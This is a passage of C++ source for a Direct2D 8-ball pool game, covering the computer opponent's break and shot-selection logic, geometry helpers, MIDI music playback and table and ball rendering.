                // Center-ish placement: Aim for the apex ball (ball ID 1 or first ball in rack)
                targetX = RACK_POS_X; // Apex ball X
                targetY = RACK_POS_Y; // Apex ball Y
            }
            else {
                // Side placement: Aim to hit the ""second"" ball of the rack for a wider spread.
                // This is a simplification. A more robust way is to find the actual second ball.
                // For now, aim slightly off the apex towards the side the cue ball is on.
                targetX = RACK_POS_X + BALL_RADIUS * 2.0f * 0.866f; // X of the second row of balls
                targetY = RACK_POS_Y + ((cueBall->y > RACK_POS_Y) ? -BALL_RADIUS : BALL_RADIUS); // Aim at the upper or lower of the two second-row balls
            }

            float dx = targetX - cueBall->x;
            float dy = targetY - cueBall->y;
            float shotAngle = atan2f(dy, dx);
            float shotPowerValue = MAX_SHOT_POWER * (0.9f + (rand() % 11) / 100.0f); // Slightly vary max power

            // Store planned shot details for the AI
            /*aiPlannedShotDetails.angle = shotAngle; // [cite: 1102, 1601]
            aiPlannedShotDetails.power = shotPowerValue; // [cite: 1102, 1601]
            aiPlannedShotDetails.spinX = 0.0f; // [cite: 1102, 1601] No spin for a standard power break
            aiPlannedShotDetails.spinY = 0.0f; // [cite: 1103, 1602]
            aiPlannedShotDetails.isValid = true; // [cite: 1103, 1602]*/

            aiPlannedShotDetails.angle = shotAngle;
            aiPlannedShotDetails.power = shotPowerValue;
            aiPlannedShotDetails.spinX = 0.0f; // No spin for break usually
            aiPlannedShotDetails.spinY = 0.0f;
            aiPlannedShotDetails.isValid = true;

            // Update global cue parameters for immediate visual feedback if DrawAimingAids uses them
            /*::cueAngle = aiPlannedShotDetails.angle;      // [cite: 1109, 1603] Update global cueAngle
            ::shotPower = aiPlannedShotDetails.power;     // [cite: 1109, 1604] Update global shotPower
            ::cueSpinX = aiPlannedShotDetails.spinX;    // [cite: 1109]
            ::cueSpinY = aiPlannedShotDetails.spinY;    // [cite: 1110]*/

            ::cueAngle = aiPlannedShotDetails.angle;
            ::shotPower = aiPlannedShotDetails.power;
            ::cueSpinX = aiPlannedShotDetails.spinX;
            ::cueSpinY = aiPlannedShotDetails.spinY;

            // Set up for AI display via GameUpdate
            /*aiIsDisplayingAim = true;                   // [cite: 1104] Enable AI aiming visualization
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES; // [cite: 1105] Set duration for display

            currentGameState = AI_THINKING; // [cite: 1081] Transition to AI_THINKING state.
                                            // GameUpdate will handle the aiAimDisplayFramesLeft countdown
                                            // and then execute the shot using aiPlannedShotDetails.
                                            // isOpeningBreakShot will be set to false within ApplyShot.

            // No immediate ApplyShot or sound here; GameUpdate's AI execution logic will handle it.*/

            aiIsDisplayingAim = true;
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES;
            currentGameState = AI_THINKING; // State changes to AI_THINKING, GameUpdate will handle shot execution after display
            aiTurnPending = false;

            return; // The break shot is now planned and will be executed by GameUpdate
        }

        // 2. If not in PRE_BREAK_PLACEMENT (e.g., if this function were called at other times,
        //    though current game logic only calls it for PRE_BREAK_PLACEMENT)
        //    This part can be extended if AIBreakShot needs to handle other scenarios.
        //    For now, the primary logic is above.
    }

    // --- Helper Functions ---

    Ball* GetBallById(int id) {
        for (size_t i = 0; i < balls.size(); ++i) {
            if (balls[i].id == id) {
                return &balls[i];
            }
        }
        return nullptr;
    }

    Ball* GetCueBall() {
        return GetBallById(0);
    }

    float GetDistance(float x1, float y1, float x2, float y2) {
        return sqrtf(GetDistanceSq(x1, y1, x2, y2));
    }

    float GetDistanceSq(float x1, float y1, float x2, float y2) {
        float dx = x2 - x1;
        float dy = y2 - y1;
        return dx * dx + dy * dy;
    }

    bool IsValidCueBallPosition(float x, float y, bool checkHeadstring) {
        // Basic bounds check (inside cushions)
        float left = TABLE_LEFT + CUSHION_THICKNESS + BALL_RADIUS;
        float right = TABLE_RIGHT - CUSHION_THICKNESS - BALL_RADIUS;
        float top = TABLE_TOP + CUSHION_THICKNESS + BALL_RADIUS;
        float bottom = TABLE_BOTTOM - CUSHION_THICKNESS - BALL_RADIUS;

        if (x < left || x > right || y < top || y > bottom) {
            return false;
        }

        // Check headstring restriction if needed
        if (checkHeadstring && x >= HEADSTRING_X) {
            return false;
        }

        // Check overlap with other balls
        for (size_t i = 0; i < balls.size(); ++i) {
            if (balls[i].id != 0 && !balls[i].isPocketed) { // Don't check against itself or pocketed balls
                if (GetDistanceSq(x, y, balls[i].x, balls[i].y) < (BALL_RADIUS * 2.0f) * (BALL_RADIUS * 2.0f)) {
                    return false; // Overlapping another ball
                }
            }
        }

        return true;
    }

    // --- NEW HELPER FUNCTION IMPLEMENTATIONS ---

    // Checks if a player has pocketed all their balls and is now on the 8-ball.
    bool IsPlayerOnEightBall(int player) {
        PlayerInfo& playerInfo = (player == 1) ? player1Info : player2Info;
        if (playerInfo.assignedType != BallType::NONE && playerInfo.assignedType != BallType::EIGHT_BALL && playerInfo.ballsPocketedCount >= 7) {
            Ball* eightBall = GetBallById(8);
            return (eightBall && !eightBall->isPocketed);
        }
        return false;
    }

    void CheckAndTransitionToPocketChoice(int playerID) {
        bool needsToCall = IsPlayerOnEightBall(playerID);

        if (needsToCall) {
            if (playerID == 1) { // Human Player 1
                currentGameState = CHOOSING_POCKET_P1;
                pocketCallMessage = player1Info.name + L"": Choose a pocket for the 8-Ball..."";
                if (calledPocketP1 == -1) calledPocketP1 = 2; // Default to bottom-right
            }
            else { // Player 2
                if (isPlayer2AI) {
                    // FOOLPROOF FIX: AI doesn't choose here. It transitions to a thinking state.
                    // AIMakeDecision will handle the choice and the pocket call.
                    currentGameState = AI_THINKING;
                    aiTurnPending = true; // Signal the main loop to run AIMakeDecision
                }
                else { // Human Player 2
                    currentGameState = CHOOSING_POCKET_P2;
                    pocketCallMessage = player2Info.name + L"": Choose a pocket for the 8-Ball..."";
                    if (calledPocketP2 == -1) calledPocketP2 = 2; // Default to bottom-right
                }
            }
        }
        else {
            // Player does not need to call a pocket, proceed to normal turn.
            pocketCallMessage = L"""";
            currentGameState = (playerID == 1) ? PLAYER1_TURN : PLAYER2_TURN;
            if (playerID == 2 && isPlayer2AI) {
                aiTurnPending = true;
            }
        }
    }


    template <typename T>
    void SafeRelease(T** ppT) {
        if (*ppT) {
            (*ppT)->Release();
            *ppT = nullptr;
        }
    }

    // --- CPU Ball?in?Hand Placement --------------------------------
    // Moves the cue ball to a legal ""ball in hand"" position for the AI.
    void AIPlaceCueBall() {
        Ball* cue = GetCueBall();
        if (!cue) return;

        // Simple strategy: place back behind the headstring at the standard break spot
        cue->x = TABLE_LEFT + TABLE_WIDTH * 0.15f;
        cue->y = RACK_POS_Y;
        cue->vx = cue->vy = 0.0f;
    }

    // --- Helper Function for Line Segment Intersection ---
    // Finds intersection point of line segment P1->P2 and line segment P3->P4
    // Returns true if they intersect, false otherwise. Stores intersection point in 'intersection'.
    bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection)
    {
        float denominator = (p4.y - p3.y) * (p2.x - p1.x) - (p4.x - p3.x) * (p2.y - p1.y);

        // Check if lines are parallel or collinear
        if (fabs(denominator) < 1e-6) {
            return false;
        }

        float ua = ((p4.x - p3.x) * (p1.y - p3.y) - (p4.y - p3.y) * (p1.x - p3.x)) / denominator;
        float ub = ((p2.x - p1.x) * (p1.y - p3.y) - (p2.y - p1.y) * (p1.x - p3.x)) / denominator;

        // Check if intersection point lies on both segments
        if (ua >= 0.0f && ua <= 1.0f && ub >= 0.0f && ub <= 1.0f) {
            intersection.x = p1.x + ua * (p2.x - p1.x);
            intersection.y = p1.y + ua * (p2.y - p1.y);
            return true;
        }

        return false;
    }

    // --- INSERT NEW HELPER FUNCTION HERE ---
    // Calculates the squared distance from point P to the line segment AB.
    float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b) {
        float l2 = GetDistanceSq(a.x, a.y, b.x, b.y);
        if (l2 == 0.0f) return GetDistanceSq(p.x, p.y, a.x, a.y); // Segment is a point
        // Consider P projecting onto the line AB infinite line
        // t = [(P-A) . (B-A)] / |B-A|^2
        float t = ((p.x - a.x) * (b.x - a.x) + (p.y - a.y) * (b.y - a.y)) / l2;
        t = std::max(0.0f, std::min(1.0f, t)); // Clamp t to the segment [0, 1]
        // Projection falls on the segment
        D2D1_POINT_2F projection = D2D1::Point2F(a.x + t * (b.x - a.x), a.y + t * (b.y - a.y));
        return GetDistanceSq(p.x, p.y, projection.x, projection.y);
    }
    // --- End New Helper ---

    // --- NEW AI Implementation Functions ---

    void AIMakeDecision() {
        // Start with a clean slate for the AI's plan.
        aiPlannedShotDetails.isValid = false;
        Ball* cueBall = GetCueBall();
        if (!cueBall || !isPlayer2AI || currentPlayer != 2) return;

        // Ask the ""expert"" (AIFindBestShot) for the best possible shot.
        AIShotInfo bestShot = AIFindBestShot();

        if (bestShot.possible) {
            // A good shot was found.
            // If it's an 8-ball shot, ""call"" the pocket.
            if (bestShot.involves8Ball) {
                calledPocketP2 = bestShot.pocketIndex;
            }
            else {
                calledPocketP2 = -1; // Ensure no pocket is called on a normal shot.
            }

            // Commit the details of the best shot to the AI's plan.
            aiPlannedShotDetails.angle = bestShot.angle;
            aiPlannedShotDetails.power = bestShot.power;
            aiPlannedShotDetails.spinX = bestShot.spinX;
            aiPlannedShotDetails.spinY = bestShot.spinY;
            aiPlannedShotDetails.isValid = true;

        }
        else {
            // No good offensive shot found, must play a safe defensive shot.
            // (This is a fallback and your current AIFindBestShot should prevent this)
            aiPlannedShotDetails.isValid = false;
        }

        // --- FOOLPROOF FIX: Trigger the Aim Display ---
        // If any valid plan was made, update the visuals and start the display pause.
        if (aiPlannedShotDetails.isValid) {

            // STEP 1: Copy the AI's plan into the global variables used for drawing.
            // This is the critical missing link.
            cueAngle = aiPlannedShotDetails.angle;
            shotPower = aiPlannedShotDetails.power;

            // STEP 2: Trigger the visual display pause.
            // These are the two lines you correctly identified.
            aiIsDisplayingAim = true;
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES;

        }
        else {
            // Absolute fallback: If no plan could be made, switch turns to prevent a freeze.
            SwitchTurns();
        }
    }


    AIShotInfo AIFindBestShot()
    {
        AIShotInfo best;                       // .possible == false
        Ball* cue = GetCueBall();
        if (!cue) return best;

        const bool on8 = IsPlayerOnEightBall(2);
        const BallType wantType = player2Info.assignedType;

        for (Ball& b : balls)
        {
            if (b.isPocketed || b.id == 0) continue;

            // decide if this ball is a legal/interesting target
            bool ok =
                on8 ? (b.id == 8) :
                ((wantType == BallType::NONE) || (b.type == wantType));

            if (!ok) continue;

            for (int p = 0; p < 6; ++p)
            {
                AIShotInfo cand = EvaluateShot(&b, p);
                if (cand.possible &&
                    (!best.possible || cand.score > best.score))
                    best = cand;
            }
        }

        // fall-back: tap cue ball forward (safety) if no potting line exists
        if (!best.possible && cue)
        {
            best.possible = true;
            best.angle = static_cast<float>(rand()) / RAND_MAX * 2.0f * PI;
            best.power = MAX_SHOT_POWER * 0.30f;
            best.spinX = best.spinY = 0.0f;
            best.targetBall = nullptr;
            best.score = -99999.0f;
            best.pocketIndex = -1;
        }
        return best;
    }


    // Evaluate a potential shot at a specific target ball towards a specific pocket
    AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex) {
        AIShotInfo shotInfo; // Defaults to not possible
        shotInfo.targetBall = targetBall;
        shotInfo.pocketIndex = pocketIndex;
        shotInfo.involves8Ball = (targetBall && targetBall->id == 8);

        Ball* cueBall = GetCueBall();
        if (!cueBall || !targetBall) return shotInfo;

        // 1. Calculate Ghost Ball position (where cue must hit target)
        shotInfo.ghostBallPos = CalculateGhostBallPos(targetBall, pocketIndex);

        // 2. Check Path: Cue Ball -> Ghost Ball Position
        if (!IsPathClear(D2D1::Point2F(cueBall->x, cueBall->y), shotInfo.ghostBallPos, cueBall->id, targetBall->id)) {
            return shotInfo; // Path blocked, shot is impossible.
        }

        // 3. Calculate Angle and Power
        float dx = shotInfo.ghostBallPos.x - cueBall->x;
        float dy = shotInfo.ghostBallPos.y - cueBall->y;
        shotInfo.angle = atan2f(dy, dx);

        float cueToGhostDist = GetDistance(cueBall->x, cueBall->y, shotInfo.ghostBallPos.x, shotInfo.ghostBallPos.y);
        float targetToPocketDist = GetDistance(targetBall->x, targetBall->y, pocketPositions[pocketIndex].x, pocketPositions[pocketIndex].y);
        shotInfo.power = CalculateShotPower(cueToGhostDist, targetToPocketDist);

        // 4. Score the shot (simple scoring: closer and straighter is better)
        shotInfo.score = 1000.0f - (cueToGhostDist + targetToPocketDist);

        // If we reached here, the shot is geometrically possible.
        shotInfo.possible = true;
        return shotInfo;
    }


    //  Estimate the power that will carry the cue-ball to the ghost position
    //  *and* push the object-ball the remaining distance to the pocket.
    //
    //  • cueToGhostDist    – pixels from cue to ghost-ball centre
    //  • targetToPocketDist– pixels from object-ball to chosen pocket
    //
    //  The function is fully deterministic (good for AI search) yet produces
    //  human-looking power levels.
    //
    float CalculateShotPower(float cueToGhostDist, float targetToPocketDist)
    {
        // Total distance the *energy* must cover (cue path + object-ball path)
        float totalDist = cueToGhostDist + targetToPocketDist;

        // Typical diagonal of the playable area (approx.) – used for scaling
        constexpr float TABLE_DIAG = 900.0f;

        // 1.  Convert distance to a 0-1 number (0: tap-in, 1: table length)
        float norm = std::clamp(totalDist / TABLE_DIAG, 0.0f, 1.0f);

        // 2.  Ease-in curve (smoothstep) for nicer progression
        norm = norm * norm * (3.0f - 2.0f * norm);

        // 3.  Blend between a gentle minimum and the absolute maximum
        const float MIN_POWER = MAX_SHOT_POWER * 0.18f;     // just enough to move
        float power = MIN_POWER + norm * (MAX_SHOT_POWER - MIN_POWER);

        // 4.  Safety clamp (also screens out degenerate calls)
        power = std::clamp(power, 0.15f, MAX_SHOT_POWER);

        return power;
    }

    // ------------------------------------------------------------------
    //  Return the ghost-ball centre needed for the target ball to roll
    //  straight into the chosen pocket.
    // ------------------------------------------------------------------
    D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex)
    {
        if (!targetBall) return D2D1::Point2F(0, 0);

        D2D1_POINT_2F P = pocketPositions[pocketIndex];

        float vx = P.x - targetBall->x;
        float vy = P.y - targetBall->y;
        float L = sqrtf(vx * vx + vy * vy);
        if (L < 1.0f) L = 1.0f;                // safety

        vx /= L;   vy /= L;

        return D2D1::Point2F(
            targetBall->x - vx * (BALL_RADIUS * 2.0f),
            targetBall->y - vy * (BALL_RADIUS * 2.0f));
    }

    // Calculate the position the cue ball needs to hit for the target ball to go towards the pocket
    // ────────────────────────────────────────────────────────────────
    //   2.  Shot evaluation & search
    // ────────────────────────────────────────────────────────────────

    //  Calculate ghost-ball position so that cue hits target towards pocket
    static inline D2D1_POINT_2F GhostPos(const Ball* tgt, int pocketIdx)
    {
        D2D1_POINT_2F P = pocketPositions[pocketIdx];
        float vx = P.x - tgt->x;
        float vy = P.y - tgt->y;
        float L = sqrtf(vx * vx + vy * vy);
        vx /= L;  vy /= L;
        return D2D1::Point2F(tgt->x - vx * (BALL_RADIUS * 2.0f),
            tgt->y - vy * (BALL_RADIUS * 2.0f));
    }

    //  Heuristic: shorter + straighter + proper group = higher score
    static inline float ScoreShot(float cue2Ghost,
        float tgt2Pocket,
        bool  correctGroup,
        bool  involves8)
    {
        float base = 2000.0f - (cue2Ghost + tgt2Pocket);   // prefer close shots
        if (!correctGroup)  base -= 400.0f;                  // penalty
        if (involves8)      base += 150.0f;                  // a bit more desirable
        return base;
    }

    // Checks if line segment is clear of obstructing balls
    // ────────────────────────────────────────────────────────────────
    //   1.  Low-level helpers – IsPathClear & FindFirstHitBall
    // ────────────────────────────────────────────────────────────────

    //  Test if the capsule [ start … end ] (radius = BALL_RADIUS)
    //  intersects any ball except the ids we want to ignore.
    bool IsPathClear(D2D1_POINT_2F start,
        D2D1_POINT_2F end,
        int ignoredBallId1,
        int ignoredBallId2)
    {
        float dx = end.x - start.x;
        float dy = end.y - start.y;
        float lenSq = dx * dx + dy * dy;
        if (lenSq < 1e-3f) return true;             // degenerate → treat as clear

        for (const Ball& b : balls)
        {
            if (b.isPocketed)      continue;
            if (b.id == ignoredBallId1 ||
                b.id == ignoredBallId2)             continue;

            // project ball centre onto the segment
            float t = ((b.x - start.x) * dx + (b.y - start.y) * dy) / lenSq;
            t = std::clamp(t, 0.0f, 1.0f);

            float cx = start.x + t * dx;
            float cy = start.y + t * dy;

            if (GetDistanceSq(b.x, b.y, cx, cy) < (BALL_RADIUS * BALL_RADIUS))
                return false;                       // blocked
        }
        return true;
    }

    //  Cast an (infinite) ray and return the first non-pocketed ball hit.
    //  `hitDistSq` is distance² from the start point to the collision point.
    Ball* FindFirstHitBall(D2D1_POINT_2F start,
        float        angle,
        float& hitDistSq)
    {
        Ball* hitBall = nullptr;
        float  bestSq = std::numeric_limits<float>::max();
        float  cosA = cosf(angle);
        float  sinA = sinf(angle);

        for (Ball& b : balls)
        {
            if (b.id == 0 || b.isPocketed) continue;         // ignore cue & sunk balls

            float relX = b.x - start.x;
            float relY = b.y - start.y;
            float proj = relX * cosA + relY * sinA;          // distance along the ray

            if (proj <= 0) continue;                         // behind cue

            // closest approach of the ray to the sphere centre
            float closestX = start.x + proj * cosA;
            float closestY = start.y + proj * sinA;
            float dSq = GetDistanceSq(b.x, b.y, closestX, closestY);

            if (dSq <= BALL_RADIUS * BALL_RADIUS)            // intersection
            {
                float back = sqrtf(BALL_RADIUS * BALL_RADIUS - dSq);
                float collDist = proj - back;                // front surface
                float collSq = collDist * collDist;
                if (collSq < bestSq)
                {
                    bestSq = collSq;
                    hitBall = &b;
                }
            }
        }
        hitDistSq = bestSq;
        return hitBall;
    }

    // Basic check for reasonable AI aim angles (optional)
    bool IsValidAIAimAngle(float angle) {
        // Placeholder - could check for NaN or infinity if calculations go wrong
        return isfinite(angle);
    }

    //midi func = start
    void PlayMidiInBackground(HWND hwnd, const TCHAR* midiPath) {
        while (isMusicPlaying) {
            MCI_OPEN_PARMS mciOpen = { 0 };
            mciOpen.lpstrDeviceType = TEXT(""sequencer"");
            mciOpen.lpstrElementName = midiPath;

            if (mciSendCommand(0, MCI_OPEN, MCI_OPEN_TYPE | MCI_OPEN_ELEMENT, (DWORD_PTR)&mciOpen) == 0) {
                midiDeviceID = mciOpen.wDeviceID;

                MCI_PLAY_PARMS mciPlay = { 0 };
                mciSendCommand(midiDeviceID, MCI_PLAY, 0, (DWORD_PTR)&mciPlay);

                // Wait for playback to complete
                MCI_STATUS_PARMS mciStatus = { 0 };
                mciStatus.dwItem = MCI_STATUS_MODE;

                do {
                    mciSendCommand(midiDeviceID, MCI_STATUS, MCI_STATUS_ITEM, (DWORD_PTR)&mciStatus);
                    Sleep(100); // adjust as needed
                } while (mciStatus.dwReturn == MCI_MODE_PLAY && isMusicPlaying);

                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }
    }

    void StartMidi(HWND hwnd, const TCHAR* midiPath) {
        if (isMusicPlaying) {
            StopMidi();
        }
        isMusicPlaying = true;
        musicThread = std::thread(PlayMidiInBackground, hwnd, midiPath);
    }

    void StopMidi() {
        if (isMusicPlaying) {
            isMusicPlaying = false;
            if (musicThread.joinable()) musicThread.join();
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }
    }

    /*void PlayGameMusic(HWND hwnd) {
        // Stop any existing playback
        if (isMusicPlaying) {
            isMusicPlaying = false;
            if (musicThread.joinable()) {
                musicThread.join();
            }
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }

        // Get the path of the executable
        TCHAR exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);

        // Extract the directory path
        TCHAR* lastBackslash = _tcsrchr(exePath, '\\');
        if (lastBackslash != NULL) {
            *(lastBackslash + 1) = '\0';
        }

        // Construct the full path to the MIDI file
        static TCHAR midiPath[MAX_PATH];
        _tcscpy_s(midiPath, MAX_PATH, exePath);
        _tcscat_s(midiPath, MAX_PATH, TEXT(""BSQ.MID""));

        // Start the background playback
        isMusicPlaying = true;
        musicThread = std::thread(PlayMidiInBackground, hwnd, midiPath);
    }*/
    //midi func = end

    // --- Drawing Functions ---

    void OnPaint() {
        HRESULT hr = CreateDeviceResources(); // Ensure resources are valid

        if (SUCCEEDED(hr)) {
            pRenderTarget->BeginDraw();
            DrawScene(pRenderTarget); // Pass render target
            hr = pRenderTarget->EndDraw();

            if (hr == D2DERR_RECREATE_TARGET) {
                DiscardDeviceResources();
                // Optionally request another paint message: InvalidateRect(hwndMain, NULL, FALSE);
                // But the timer loop will trigger redraw anyway.
            }
        }
        // If CreateDeviceResources failed, EndDraw might not be called.
        // Consider handling this more robustly if needed.
    }

    void DrawScene(ID2D1RenderTarget* pRT) {
        if (!pRT) return;

        //pRT->Clear(D2D1::ColorF(D2D1::ColorF::LightGray)); // Background color
        // Set background color to #ffffcd (RGB: 255, 255, 205)
        pRT->Clear(D2D1::ColorF(0.3686f, 0.5333f, 0.3882f)); // Clear with light yellow background NEWCOLOR 1.0f, 1.0f, 0.803f => (0.3686f, 0.5333f, 0.3882f)
        //pRT->Clear(D2D1::ColorF(1.0f, 1.0f, 0.803f)); // Clear with light yellow background NEWCOLOR 1.0f, 1.0f, 0.803f => (0.3686f, 0.5333f, 0.3882f)

        DrawTable(pRT, pFactory);
        DrawPocketSelectionIndicator(pRT); // Draw arrow over selected/called pocket
        DrawBalls(pRT);
        DrawAimingAids(pRT); // Includes cue stick if aiming
        DrawUI(pRT);
        DrawPowerMeter(pRT);
        DrawSpinIndicator(pRT);
        DrawPocketedBallsIndicator(pRT);
        DrawBallInHandIndicator(pRT); // Draw cue ball ghost if placing

         // Draw Game Over Message
        if (currentGameState == GAME_OVER && pTextFormat) {
            ID2D1SolidColorBrush* pBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pBrush);
            if (pBrush) {
                D2D1_RECT_F layoutRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP + TABLE_HEIGHT / 2 - 30, TABLE_RIGHT, TABLE_TOP + TABLE_HEIGHT / 2 + 30);
                pRT->DrawText(
                    gameOverMessage.c_str(),
                    (UINT32)gameOverMessage.length(),
                    pTextFormat, // Use large format maybe?
                    &layoutRect,
                    pBrush
                );
                SafeRelease(&pBrush);
            }
        }

    }

    void DrawTable(ID2D1RenderTarget* pRT, ID2D1Factory* pFactory) {
        ID2D1SolidColorBrush* pBrush = nullptr;

        // === Draw Full Orange Frame (Table Border) ===
        ID2D1SolidColorBrush* pFrameBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.9157f, 0.6157f, 0.2000f), &pFrameBrush); //NEWCOLOR ::Orange (no brackets) => (0.9157, 0.6157, 0.2000)
        //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pFrameBrush); //NEWCOLOR ::Orange (no brackets) => (0.9157, 0.6157, 0.2000)
        if (pFrameBrush) {
            D2D1_RECT_F outerRect = D2D1::RectF(
                TABLE_LEFT - CUSHION_THICKNESS,
                TABLE_TOP - CUSHION_THICKNESS,
                TABLE_RIGHT + CUSHION_THICKNESS,
                TABLE_BOTTOM + CUSHION_THICKNESS
            );
            pRT->FillRectangle(&outerRect, pFrameBrush);
            SafeRelease(&pFrameBrush);
        }

        // Draw Table Bed (Green Felt)
        pRT->CreateSolidColorBrush(TABLE_COLOR, &pBrush);
        if (!pBrush) return;
        D2D1_RECT_F tableRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP, TABLE_RIGHT, TABLE_BOTTOM);
        pRT->FillRectangle(&tableRect, pBrush);
        SafeRelease(&pBrush);

        // Draw Cushions (Red Border)
        pRT->CreateSolidColorBrush(CUSHION_COLOR, &pBrush);
        if (!pBrush) return;
        // Top Cushion (split by middle pocket)
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
        // Bottom Cushion (split by middle pocket)
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
        // Left Cushion
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT - CUSHION_THICKNESS, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_LEFT, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
        // Right Cushion
        pRT->FillRectangle(D2D1::RectF(TABLE_RIGHT, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_RIGHT + CUSHION_THICKNESS, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
        SafeRelease(&pBrush);


        // Draw Pockets (Black Circles)
        pRT->CreateSolidColorBrush(POCKET_COLOR, &pBrush);
        if (!pBrush) return;
        for (int i = 0; i < 6; ++i) {
            D2D1_ELLIPSE ellipse = D2D1::Ellipse(pocketPositions[i], HOLE_VISUAL_RADIUS, HOLE_VISUAL_RADIUS);
            pRT->FillEllipse(&ellipse, pBrush);
        }
        SafeRelease(&pBrush);

        // Draw Headstring Line (White)
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.4235f, 0.5647f, 0.1765f, 1.0f), &pBrush); // NEWCOLOR ::White => (0.2784, 0.4549, 0.1843)
        //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pBrush); // NEWCOLOR ::White => (0.2784, 0.4549, 0.1843)
        if (!pBrush) return;
        pRT->DrawLine(
            D2D1::Point2F(HEADSTRING_X, TABLE_TOP),
            D2D1::Point2F(HEADSTRING_X, TABLE_BOTTOM),
            pBrush,
            1.0f // Line thickness
        );
        SafeRelease(&pBrush);

        // Draw Semicircle facing West (flat side East)
        // Draw Semicircle facing East (curved side on the East, flat side on the West)
        ID2D1PathGeometry* pGeometry = nullptr;
        HRESULT hr = pFactory->CreatePathGeometry(&pGeometry);
        if (SUCCEEDED(hr) && pGeometry)
        {
            ID2D1GeometrySink* pSink = nullptr;
            hr = pGeometry->Open(&pSink);
            if (SUCCEEDED(hr) && pSink)
            {
                float radius = 60.0f; // Radius for the semicircle
                D2D1_POINT_2F center = D2D1::Point2F(HEADSTRING_X, (TABLE_TOP + TABLE_BOTTOM) / 2.0f);

                // For a semicircle facing East (curved side on the East), use the top and bottom points.
                D2D1_POINT_2F startPoint = D2D1::Point2F(center.x, center.y - radius); // Top point

                pSink->BeginFigure(startPoint, D2D1_FIGURE_BEGIN_HOLLOW);

                D2D1_ARC_SEGMENT arc = {};
                arc.point = D2D1::Point2F(center.x, center.y + radius); // Bottom point
                arc.size = D2D1::SizeF(radius, radius);
                arc.rotationAngle = 0.0f;
                // Use the correct identifier with the extra underscore:
                arc.sweepDirection = D2D1_SWEEP_DIRECTION_COUNTER_CLOCKWISE;
                arc.arcSize = D2D1_ARC_SIZE_SMALL;

                pSink->AddArc(&arc);
                pSink->EndFigure(D2D1_FIGURE_END_OPEN);
                pSink->Close();
                SafeRelease(&pSink);

                ID2D1SolidColorBrush* pArcBrush = nullptr;
                //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.3f), &pArcBrush);
                pRT->CreateSolidColorBrush(D2D1::ColorF(0.4235f, 0.5647f, 0.1765f, 1.0f), &pArcBrush);
                if (pArcBrush)
                {
                    pRT->DrawGeometry(pGeometry, pArcBrush, 1.5f);
                    SafeRelease(&pArcBrush);
                }
            }
            SafeRelease(&pGeometry);
        }




    }


    // ----------------------------------------------
    //  Helper : clamp to [0,1] and lighten a colour
    // ----------------------------------------------
    static D2D1_COLOR_F Lighten(const D2D1_COLOR_F& c, float factor = 1.25f)
    {
        return D2D1::ColorF(
            std::min(1.0f, c.r * factor),
            std::min(1.0f, c.g * factor),
            std::min(1.0f, c.b * factor),
            c.a);
    }

    // ------------------------------------------------
    //  NEW  DrawBalls – radial-gradient “spot-light”
    // ------------------------------------------------
    void DrawBalls(ID2D1RenderTarget* pRT)
    {
        if (!pRT) return;

        ID2D1SolidColorBrush* pStripeBrush = nullptr;    // white stripe
        ID2D1SolidColorBrush* pBorderBrush = nullptr;    // black ring

        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);

        for (const Ball& b : balls)
        {
            if (b.isPocketed) continue;

            //------------------------------------------
            // Build the radial gradient for THIS ball
            //------------------------------------------
            ID2D1GradientStopCollection* pStops = nullptr;
            ID2D1RadialGradientBrush* pRad = nullptr;

            D2D1_GRADIENT_STOP gs[3];
            gs[0].position = 0.0f;  gs[0].color = D2D1::ColorF(1, 1, 1, 0.95f);     // bright spot
